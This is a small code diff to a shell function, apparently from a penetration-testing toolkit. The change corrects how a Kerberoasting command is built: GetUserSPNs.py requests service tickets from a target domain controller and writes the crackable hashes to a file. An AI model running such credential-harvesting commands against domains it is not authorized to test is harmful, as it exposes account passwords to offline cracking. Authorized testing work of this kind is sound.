@@ -45,5 +45,5 @@ nb-ad-kerb-kerberoast() {
     __check-user
     __ask "Enter the IP address of the target domain controller"
     nb-vars-set-rhost
-    print -z "GetUserSPNs.py -request ${__DOMAIN}s/${__USER} -dc-ip ${__RHOST} | tee $(__domadpath)/kerberoast.txt"
+    print -z "GetUserSPNs.py -request ${__DOMAIN}/${__USER} -dc-ip ${__RHOST} -outputfile $(__domadpath)/kerberoast.txt"
 }
